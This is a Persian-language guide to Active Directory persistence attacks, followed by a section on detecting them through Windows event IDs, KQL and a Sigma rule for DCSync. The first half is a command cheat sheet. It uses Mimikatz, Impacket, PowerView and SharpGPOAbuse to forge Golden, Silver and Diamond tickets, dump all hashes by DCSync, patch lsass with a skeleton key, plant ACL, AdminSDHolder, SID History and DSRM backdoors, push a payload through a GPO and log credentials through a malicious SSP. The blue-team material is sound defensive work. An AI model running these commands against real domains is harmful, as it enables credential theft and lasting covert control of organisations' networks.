

# AD Persistence Techniques — راهنمای جامع

---

## ۱. Golden Ticket Attack

**مفهوم:** جعل TGT (Ticket Granting Ticket) با استفاده از hash مخفی حساب `krbtgt`.

krbtgt hash → جعل هر TGT دلخواه → دسترسی به هر سرویس در دامنه


**پیش‌نیاز:** hash حساب `krbtgt` (معمولاً از DCSync یا lsass dump)

```powershell
# با Mimikatz:
# مرحله ۱: دریافت krbtgt hash
lsadump::dcsync /domain:corp.local /user:krbtgt

# مرحله ۲: ساخت Golden Ticket
kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<NTLM_HASH> /ptt

# /ptt → Pass The Ticket (inject مستقیم به session)
```

**با Impacket:**
```bash
python3 ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local FakeAdmin
export KRB5CCNAME=FakeAdmin.ccache
secretsdump.py -k -no-pass dc01.corp.local
```

**چرا خطرناک:**
- تا زمانی که `krbtgt` reset نشود (باید ۲ بار reset شود!) معتبر است
- بدون تغییر پسورد هیچ کاربری، دسترسی حفظ می‌شود
- قابل ساخت برای هر username (حتی غیرموجود)

---

## ۲. Silver Ticket Attack

**مفهوم:** جعل TGS (Service Ticket) برای یک سرویس خاص با hash حساب سرویس.

Service Account hash → جعل TGS برای آن سرویس → بدون نیاز به DC


```powershell
# با Mimikatz:
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... \
  /target:fileserver.corp.local /service:cifs /rc4:<SERVICE_HASH> /ptt
```

**سرویس‌های قابل هدف:**

| Service | دسترسی |
|---|---|
| `cifs` | SMB / File Share |
| `http` | IIS / Web |
| `mssql` | SQL Server |
| `host` | WMI / PSRemoting |
| `ldap` | AD queries |

**مزیت نسبت به Golden:** بدون ارتباط با DC، کمتر لاگ می‌شود.

---

## ۳. DCSync Attack

**مفهوم:** شبیه‌سازی رفتار یک Domain Controller برای دریافت hash همه کاربران.

**پیش‌نیاز:** دسترسی‌های زیر روی root domain object:
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

```bash
# با Impacket:
secretsdump.py corp.local/admin:'Password'@dc01.corp.local -just-dc

# با Mimikatz:
lsadump::dcsync /domain:corp.local /all /csv
lsadump::dcsync /domain:corp.local /user:krbtgt
```

**اضافه کردن permission (برای persistence):**
```powershell
# PowerView:
Add-ObjectACL -TargetDistinguishedName "DC=corp,DC=local" `
  -PrincipalIdentity backdoor_user `
  -Rights DCSync
```

---

## ۴. Skeleton Key

**مفهوم:** patch کردن پروسه `lsass` روی DC تا یک رمز عبور جهانی قبول شود.

```powershell
# با Mimikatz (باید روی DC اجرا شود):
misc::skeleton
```

**نتیجه:**
هر کاربر → رمز اصلی خودش یا رمز "mimikatz" → ورود موفق


**محدودیت:**
- In-memory → بعد از restart از بین می‌رود
- برای ماندگاری باید مجدداً inject شود
- قابل تشخیص با آنتی‌ویروس/EDR

---

## ۵. AdminSDHolder Abuse

**مفهوم:** `AdminSDHolder` یک container ویژه است که ACL آن هر ۶۰ دقیقه به گروه‌های privileged propagate می‌شود.

AdminSDHolder ACL → SDProp task → Domain Admins, Enterprise Admins, ...


```powershell
# اضافه کردن کنترل کامل روی AdminSDHolder:
Add-ObjectACL -TargetSearchBase "CN=AdminSDHolder,CN=System,DC=corp,DC=local" `
  -PrincipalIdentity backdoor_user `
  -Rights All

# بعد از ۶۰ دقیقه:
# backdoor_user روی تمام گروه‌های privileged کنترل کامل دارد
```

**برای force کردن فوری:**
```powershell
$task = Get-ScheduledTask -TaskName "SDProp"
Start-ScheduledTask -InputObject $task
```

---

## ۶. ACL / ACE Backdoor

**مفهوم:** اضافه کردن مجوزهای مخفی به objectهای مهم AD.

**targetهای مهم:**

```powershell
# روی Domain Object → DCSync
Add-ObjectACL -TargetDN "DC=corp,DC=local" `
  -PrincipalIdentity evil_user -Rights DCSync

# روی گروه Domain Admins → عضویت خودکار
Add-ObjectACL -TargetIdentity "Domain Admins" `
  -PrincipalIdentity evil_user -Rights WriteMembers

# روی کاربر → ResetPassword
Add-ObjectACL -TargetIdentity target_admin `
  -PrincipalIdentity evil_user -Rights ResetPassword

# روی GPO → اجرای policy مخرب
Add-ObjectACL -TargetIdentity "Default Domain Policy" `
  -PrincipalIdentity evil_user -Rights Modify
```

**ابزار تشخیص ACE مخرب:**
```powershell
# BloodHound این روابط را به صورت گراف نشان می‌دهد
# PowerView:
Get-ObjectACL -Identity "Domain Admins" -ResolveGUIDs | 
  Where-Object {$_.ActiveDirectoryRights -match "Write"}
```

---

## ۷. GPO Abuse (Group Policy Object)

**مفهوم:** استفاده از Group Policy برای اجرای payload روی تمام ماشین‌های دامنه.

```powershell
# ساخت GPO مخرب:
New-GPO -Name "Windows Security Update"
Set-GPRegistryValue -Name "Windows Security Update" `
  -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" `
  -ValueName "Updater" -Type String -Value "C:\Windows\Temp\payload.exe"

# اعمال GPO به OU:
New-GPLink -Name "Windows Security Update" -Target "OU=Workstations,DC=corp,DC=local"
```

**با SharpGPOAbuse:**
```bash
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
  --Author SYSTEM --Command "cmd.exe" --Arguments "/c payload.exe" \
  --GPOName "Default Domain Policy"
```

---

## ۸. SID History Injection

**مفهوم:** اضافه کردن SID گروه‌های privileged (مثل Domain Admins) به attribute `SIDHistory` یک کاربر عادی.

کاربر عادی + SIDHistory = S-1-5-21-...-512 → دسترسی‌های Domain Admin


```powershell
# با Mimikatz:
lsadump::sid /patch
misc::addsid backdoor_user S-1-5-21-<OLD_DOMAIN>-512

# یا از طریق domain migration:
# SIDHistory معمولاً در migration استفاده می‌شود → قابل سوءاستفاده
```

**تشخیص سخت:** چون کاربر از نظر ظاهری عادی است.

---

## ۹. DSRM Account Backdoor

**مفهوم:** DSRM (Directory Services Restore Mode) یک حساب local admin روی هر DC است که برای بازیابی استفاده می‌شود.

```powershell
# تغییر رمز DSRM:
ntdsutil
  set dsrm password
  reset password on server dc01.corp.local

# فعال‌سازی ورود شبکه‌ای با DSRM:
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" `
  -Name "DsrmAdminLogonBehavior" -Value 2

# استفاده:
sekurlsa::pth /domain:dc01 /user:Administrator /ntlm:<DSRM_HASH>
```

**چرا مفید:** حتی اگر همه account‌های AD غیرفعال شوند، این کار می‌کند.

---

## ۱۰. Kerberoasting + Targeted Kerberoasting

**مفهوم برای persistence:** اضافه کردن SPN به یک حساب backdoor → بعداً hash آن را crack می‌کنند.

```powershell
# اضافه کردن SPN به backdoor account:
Set-ADUser backdoor_user -ServicePrincipalNames @{Add="HTTP/fake.corp.local"}

# درخواست TGS برای crack:
Invoke-Kerberoast -OutputFormat Hashcat | Out-File hashes.txt

# Crack:
hashcat -m 13100 hashes.txt wordlist.txt
```

---

## ۱۱. Malicious SSP (Security Support Provider)

**مفهوم:** اضافه کردن یک SSP سفارشی که credential همه ورودها را لاگ می‌کند.

```powershell
# با Mimikatz:
misc::memssp
# → رمزهای عبور در C:\Windows\System32\mimilsa.log ذخیره می‌شود

# برای persistence دائم:
# اضافه کردن DLL به:
# HKLM\SYSTEM\CurrentControlSet\Control\Lsa → Security Packages
```

---

## ۱۲. Forged PAC / Diamond Ticket

**Diamond Ticket:** مشابه Golden Ticket اما TGT واقعی را patch می‌کند → تشخیص سخت‌تر.

```bash
# با ticketer (Impacket جدید):
python3 ticketer.py -request -domain corp.local \
  -user legitimate_user -password 'Pass' \
  -nthash <krbtgt_hash> -domain-sid S-1-5-21-... \
  -aesKey <krbtgt_aes> diamond_ticket
```

**تفاوت با Golden Ticket:**
Golden:  TGT جعلی کامل → PAC جعلی → تشخیص با PAC validation
Diamond: TGT واقعی + PAC patch شده → valid signature → تشخیص سخت


---

## ۱۳. Machine Account Persistence

```powershell
# ایجاد computer account با دسترسی بالا:
New-MachineAccount -MachineAccount FakeDC -Password (ConvertTo-SecureString 'Pass' -AsPlainText -Force)

# استفاده در RBCD (Resource-Based Constrained Delegation):
Set-ADComputer target_server -PrincipalsAllowedToDelegateToAccount FakeDC$
```

---

## جمع‌بندی و مقایسه

| تکنیک | پیش‌نیاز | پایداری | سختی تشخیص | اثر |
|---|---|---|---|---|
| Golden Ticket | krbtgt hash | تا reset krbtgt | متوسط | کل دامنه |
| Silver Ticket | Service hash | تا reset service | کم | یک سرویس |
| DCSync Rights | DA access | دائم | زیاد | همه hash‌ها |
| Skeleton Key | DA + DC access | تا reboot | متوسط | همه کاربران |
| AdminSDHolder | DA access | دائم | زیاد | گروه‌های privileged |
| ACL Backdoor | DA access | دائم | زیاد | متغیر |
| GPO Abuse | GPO write | دائم | متوسط | همه ماشین‌ها |
| SID History | DA access | دائم | زیاد | هر سطح دلخواه |
| DSRM | Local DC admin | دائم | زیاد | هر DC |
| Malicious SSP | DA access | دائم | زیاد | credential harvest |

---

## تشخیص (Blue Team)

```powershell
# Golden/Silver Ticket:
# Event ID 4769 با Encryption Type 0x17 (RC4) مشکوک است
# Event ID 4624 با Logon Type 3 و account غیرعادی

# DCSync:
# Event ID 4662 با "DS-Replication-Get-Changes-All"

# AdminSDHolder:
# Event ID 4780 (ACL روی privileged objects تنظیم شد)

# SID History:
Get-ADUser -Filter * -Properties SIDHistory | Where-Object {$_.SIDHistory}

# Skeleton Key:
# Event ID 4673 در lsass process
```

```bash
# BloodHound برای یافتن ACE مخرب:
bloodhound-python -d corp.local -u user -p pass -c All
# سپس در UI: "Find Shortest Path to Domain Admins"
```

---

# Event IDهای مهم در Active Directory و Windows

---

## AD Changes & Object Manipulation

| Event ID | توضیح | کجا لاگ می‌شود |
|---|---|---|
| **4720** | ساخت User Account جدید | DC |
| **4722** | فعال‌سازی User Account | DC |
| **4723** | تلاش برای تغییر پسورد | DC |
| **4724** | Reset پسورد توسط Admin | DC |
| **4725** | غیرفعال‌سازی User Account | DC |
| **4726** | حذف User Account | DC |
| **4728** | اضافه شدن عضو به Security Group سراسری | DC |
| **4732** | اضافه شدن عضو به Security Group محلی | DC |
| **4756** | اضافه شدن عضو به Universal Security Group | DC |
| **4738** | تغییر در تنظیمات User Account | DC |
| **4741** | ساخت Computer Account جدید | DC |
| **4743** | حذف Computer Account | DC |
| **5136** | **تغییر در AD Object (Directory Service Object Modified)** | DC |
| **5137** | ساخت AD Object جدید | DC |
| **5138** | Undelete شدن AD Object | DC |
| **5139** | جابجایی AD Object | DC |
| **5141** | حذف AD Object | DC |

### 5136 چیست؟

وقتی attribute یک AD object تغییر می‌کند → Event 5136 ثبت می‌شود


**چه چیزی لاگ می‌شود:**
ObjectDN:        CN=AdminSDHolder,CN=System,DC=corp,DC=local
ObjectClass:     container
AttributeLDAPDisplayName: nTSecurityDescriptor    ← تغییر ACL
AttributeValue:  new ACL value
OperationType:   Value Added / Value Deleted


**موارد حساس در 5136:**
- تغییر `nTSecurityDescriptor` → ACL backdoor
- تغییر `SIDHistory` → SID History injection
- تغییر `ServicePrincipalName` → Kerberoasting setup
- تغییر `msDS-AllowedToActOnBehalfOfOtherIdentity` → RBCD abuse
- تغییر `adminCount` → تغییر دستی در protected objects

---

## Authentication & Kerberos

| Event ID | توضیح | نشانه چه حمله‌ای |
|---|---|---|
| **4624** | ورود موفق | - |
| **4625** | ورود ناموفق | Brute Force |
| **4627** | اطلاعات Group Membership در ورود | Golden/Silver Ticket |
| **4648** | ورود با credential صریح (RunAs) | Pass-the-Hash |
| **4672** | ورود با privilege ویژه (Admin) | - |
| **4768** | درخواست TGT (AS-REQ) | AS-REP Roasting |
| **4769** | درخواست TGS (TGS-REQ) | Kerberoasting, Silver Ticket |
| **4770** | تجدید TGT | - |
| **4771** | شکست در Pre-Authentication | Brute Force on Kerberos |
| **4776** | NTLM Authentication | Pass-the-Hash |

### 4769 برای تشخیص Kerberoasting:
Ticket Encryption Type: 0x17 (RC4-HMAC)  ← مشکوک
                        0x12 (AES256)     ← طبیعی

Service Name: نه krbtgt و نه با $ ختم شود  ← SPN های عادی


### 4768 برای AS-REP Roasting:
Pre-Authentication Type: 0  ← یعنی حساب DONT_REQ_PREAUTH دارد


---

## Replication & DCSync

| Event ID | توضیح                         | نشانه چه حمله‌ای |
| -------- | ----------------------------- | ---------------- |
| **4662** | عملیات روی AD Object          | **DCSync**       |
| **4929** | حذف AD Naming Context Replica | -                |

### 4662 برای DCSync:
Object Type:   domainDNS
Properties:    {1131f6aa...}  ← DS-Replication-Get-Changes
               {1131f6ad...}  ← DS-Replication-Get-Changes-All
               {89e95b76...}  ← DS-Replication-Get-Changes-In-Filtered-Set

Subject:       ← اگر کاربر عادی باشد (نه DC account) → مشکوک


---

## Privilege & Policy Changes

| Event ID | توضیح | نشانه چه حمله‌ای |
|---|---|---|
| **4670** | تغییر Permission روی Object | ACL Backdoor |
| **4673** | تلاش برای استفاده از Privilege حساس | Skeleton Key در lsass |
| **4674** | عملیات روی Object Privileged | - |
| **4703** | تغییر Token Privilege | - |
| **4704** | اختصاص User Right | - |
| **4705** | حذف User Right | - |
| **4713** | تغییر Kerberos Policy | - |
| **4714** | تغییر Encrypted Data Recovery Policy | - |
| **4715** | تغییر Audit Policy روی Object | - |
| **4780** | **تنظیم ACL روی privileged group members** | AdminSDHolder Abuse |
| **4739** | تغییر Domain Policy | - |

---

## Group Policy

| Event ID | توضیح | نشانه چه حمله‌ای |
|---|---|---|
| **5136** | تغییر GPO object در AD | GPO Abuse |
| **4706** | ساخت Trust جدید | Domain Trust Abuse |
| **4707** | حذف Domain Trust | - |
| **4716** | تغییر Domain Trust | - |

---

## Process & Execution

| Event ID | توضیح | نشانه چه حمله‌ای |
|---|---|---|
| **4688** | ساخت Process جدید | مانیتورینگ عمومی |
| **4689** | خاتمه Process | - |
| **4698** | ساخت Scheduled Task | Persistence |
| **4699** | حذف Scheduled Task | - |
| **4700** | فعال‌سازی Scheduled Task | Persistence |
| **4702** | بروزرسانی Scheduled Task | Persistence |

---

## Logon Types مهم در 4624

| Logon Type | معنی | نشانه |
|---|---|---|
| 2 | Interactive (کنسول) | ورود مستقیم |
| 3 | Network (SMB, etc.) | Lateral Movement |
| 4 | Batch (Scheduled Task) | Persistence |
| 5 | Service | - |
| 7 | Unlock | - |
| 8 | NetworkCleartext | Credential در متن واضح |
| 9 | NewCredentials (RunAs /netonly) | Pass-the-Hash |
| 10 | RemoteInteractive (RDP) | Lateral Movement |

---

## جمع‌بندی مهم‌ترین‌ها برای SOC

DCSync:           4662 (DS-Replication-Get-Changes-All)
Golden Ticket:    4769 (Encryption 0x17) + 4624 بدون 4768
Silver Ticket:    4769 بدون 4768 قبلش
Kerberoasting:    4769 (Encryption 0x17, service account)
AdminSDHolder:    4780
ACL Backdoor:     5136 (nTSecurityDescriptor تغییر کرد)
Skeleton Key:     4673 در lsass.exe
Pass-the-Hash:    4624 (Type 3) + 4776
Persistence:      4698, 4702
LDAP Recon:       4662 با object type = user/computer


---




# تشخیص DCSync با Event ID 4662

---

## DCSync چیست؟ (سریع)

وقتی یک DC نیاز دارد با DC دیگر sync شود، از پروتکل **MS-DRSR** (Directory Replication Service Remote Protocol) استفاده می‌کند.

DCSync این فرایند را **جعل** می‌کند — مهاجم وانمود می‌کند یک DC است و از DC واقعی می‌خواهد hash کاربران را برایش بفرستد.

---

## چه Permission هایی نیاز است؟

DS-Replication-Get-Changes           → GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
DS-Replication-Get-Changes-All       → GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
DS-Replication-Get-Changes-In-Filtered-Set → GUID: 89e95b76-444d-4c62-991a-0facbeda640c


**به صورت پیش‌فرض این Permission ها فقط به این‌ها داده شده:**

Domain Controllers
Domain Admins
Enterprise Admins
SYSTEM


پس اگر یک کاربر عادی این Permission ها را داشته باشد → مشکوک است.

---

## ساختار Event 4662

```xml
Event ID: 4662
Subject:
  Security ID:   CORP\john.doe        ← اینجا مهم است
  Account Name:  john.doe
  Account Domain: CORP
  Logon ID:      0x1A2B3C

Object:
  Object Server:  DS
  Object Type:    domainDNS            ← باید domainDNS باشد
  Object Name:    DC=corp,DC=local
  Handle ID:      -

Operation:
  Operation Type: Object Access
  Accesses:       
    %%7688          ← DS-Replication-Get-Changes
    %%7692          ← DS-Replication-Get-Changes-All

Properties:
  {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}   ← Get-Changes
  {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}   ← Get-Changes-All
```

---

## تفاوت Get-Changes و Get-Changes-All

| Permission | چه چیزی Replicate می‌شود | اهمیت |
|---|---|---|
| **Get-Changes** | اطلاعات عمومی AD Objects | کمتر خطرناک |
| **Get-Changes-All** | **همه چیز شامل Password Hash** | **بحرانی** |
| **Get-Changes-In-Filtered-Set** | Attribute های خاص (مثل RODC) | متوسط |

Get-Changes-All = دسترسی به NT Hash + LM Hash + Kerberos Keys
                  برای همه کاربران شامل krbtgt و Administrator


یعنی اگر مهاجم فقط **Get-Changes-All** داشته باشد، می‌تواند DCSync کند.

---

## Detection Logic — چه چیزی alert بزن؟

### شرط اصلی:

```python
Event ID == 4662
AND Object Type == "domainDNS"
AND (
    Properties contains "1131f6ad"   # Get-Changes-All  ← مهم‌تر
    OR
    Properties contains "1131f6aa"   # Get-Changes
)
AND Subject.Account NOTIN [
    "Domain Controllers",
    "MSOL_*",          # Azure AD Sync
    "AAD_*",           # Azure AD Connect
    "$" accounts       # Computer accounts (DC های واقعی)
]
```

### KQL برای Microsoft Sentinel:

```kusto
SecurityEvent
| where EventID == 4662
| where ObjectType == "domainDNS"
| where Properties has "1131f6ad"   // Get-Changes-All
    or Properties has "1131f6aa"    // Get-Changes
| where SubjectUserName !endswith "$"           // Computer account نباشد
| where SubjectUserName !startswith "MSOL_"     // Azure AD Sync نباشد
| where SubjectUserName !startswith "AAD_"
| project TimeGenerated, SubjectUserName, SubjectDomainName,
          SubjectLogonId, Properties, Computer
| order by TimeGenerated desc
```

### Sigma Rule:

```yaml
title: DCSync Attack via 4662
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    ObjectType: 'domainDNS'
  filter_get_changes:
    Properties|contains:
      - '1131f6aa'   # Get-Changes
      - '1131f6ad'   # Get-Changes-All
  filter_legitimate:
    SubjectUserName|endswith: '$'   # DC computer accounts
  condition: selection and filter_get_changes and not filter_legitimate
falsepositives:
  - Azure AD Connect (MSOL_ accounts)
  - Legitimate replication tools
level: high
```

---

## False Positive های رایج

MSOL_XXXXXXXX     → Azure AD Connect (Microsoft)
AAD_XXXXXXXX      → Azure AD Connect (دیگر)
CORP\DC01$        → Domain Controller واقعی
CORP\DC02$        → Domain Controller واقعی


**این‌ها را Whitelist کن، بقیه را Alert کن.**

---

## چطور مطمئن شویم DCSync اتفاق افتاده؟

### روش ۱ — Correlation با 4624:

اگر 4662 دیدی از CORP\john.doe:
→ بررسی کن آیا john.doe در همان زمان Logon Type 3 از یک IP غیر DC داشته


### روش ۲ — Network Level:

DCSync از طریق پورت 135 و RPC انجام می‌شود
اگر یک non-DC با DC از طریق RPC/DRSUAPI ارتباط برقرار کرد → مشکوک

پروتکل: MS-DRSR
Function: DRSGetNCChanges()


### روش ۳ — بررسی کسی که Permission دارد:

```powershell
# چه کسانی Replication permission دارند؟
(Get-Acl "AD:\DC=corp,DC=local").Access | 
Where-Object {
    $_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or
    $_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
} | 
Select-Object IdentityReference, ObjectType, AccessControlType
```

---

## خلاصه Detection

Alert بزن وقتی:
  ✓ Event 4662
  ✓ ObjectType = domainDNS
  ✓ GUID 1131f6ad (Get-Changes-All) وجود داشت
  ✓ Account یک $ نداشت (یعنی DC نیست)
  ✓ Account در لیست سفید نبود

Severity: Critical
Response: فوری — Hash همه حساب‌ها را باید Reset کرد
